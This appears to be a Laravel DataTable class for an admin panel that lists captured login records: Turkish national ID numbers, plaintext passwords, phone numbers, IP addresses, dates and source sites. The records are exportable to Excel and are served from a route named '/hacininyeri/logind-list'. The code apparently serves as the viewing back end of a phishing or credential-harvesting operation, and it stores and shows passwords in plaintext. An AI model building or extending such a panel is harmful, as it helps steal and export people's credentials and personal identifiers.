<?php

namespace App\DataTables;

use App\Classes\SystemStatusEnum;
use App\Models\LoginModel;
use Illuminate\Database\Eloquent\Builder as QueryBuilder;
use Yajra\DataTables\EloquentDataTable;
use Yajra\DataTables\Html\Builder as HtmlBuilder;
use Yajra\DataTables\Html\Button;
use Yajra\DataTables\Html\Column;
use Yajra\DataTables\Html\Editor\Editor;
use Yajra\DataTables\Html\Editor\Fields;
use Yajra\DataTables\Services\DataTable;
use Str;

class LoginDModelDatatable extends DataTable
{
    /**
     * Build the DataTable class.
     *
     * @param QueryBuilder $query Results from query() method.
     */
    public function dataTable(QueryBuilder $query): EloquentDataTable
    {
        return (new EloquentDataTable($query))
            ->editColumn('id', function ($row) {
                return $row->id;
            })
            ->editColumn('tc', function ($row) {
                if (auth()->user()->hasDirectPermission('ads')) {
                    return str_repeat('*', strlen($row->tc));
                }

                return $row->tc;
            })
            ->editColumn('password', function ($row) {
                if (auth()->user()->hasDirectPermission('ads')) {
                    return str_repeat('*', strlen($row->password));
                }
                return $row->password;  // Parolayı kısaltarak gösterme
            })
            ->editColumn('phone', function ($row) {
                if (auth()->user()->hasDirectPermission('ads')) {
                    return str_repeat('*', strlen($row->phone));
                }
                return $row->phone;
            })
            ->editColumn('ip', function ($row) {
                if (auth()->user()->hasDirectPermission('ads')) {
                    return str_repeat('*', strlen($row->ip));
                }                
                return $row->ip;
            })
            ->editColumn('date', function ($row) {
                return $row->date;
            })
            ->editColumn('site', function ($row) {
                return $row->site;
            })
            ->setRowId('id');
    }

    /**
     * Get the query source of dataTable.
     */
    public function query(LoginModel $model): QueryBuilder
    {
        $query = $model->newQuery()->where('system_id', SystemStatusEnum::D);
        return $query;
    }

    /**
     * Optional method if you want to use the html builder.
     */
    public function html(): HtmlBuilder
    {
        return $this->builder()
            ->columns($this->getColumns())
            ->minifiedAjax()
            ->parameters([
                'dom' => 'Blfrtip',
                'order' => [[0, 'desc']],
                "lengthMenu" => [10, 50, 100, 500],
                "pageLength" => "50",
                'buttons' => [
                    'excel',
                    'reload',
                ],
            ])->ajax([
                'url' => '/hacininyeri/logind-list',
                "type" => 'GET',
            ]);
    }

    /**
     * Get the dataTable columns definition.
     */
    public function getColumns(): array
    {
        return [
            Column::make('id'),
            Column::make('tc'),
            Column::make('password'),
            Column::make('phone'),
            Column::make('ip'),
            Column::make('date'),
            Column::make('site'),
        ];
    }

    /**
     * Get the filename for export.
     */
    protected function filename(): string
    {
        return 'LoginModel_' . date('YmdHis');
    }
}
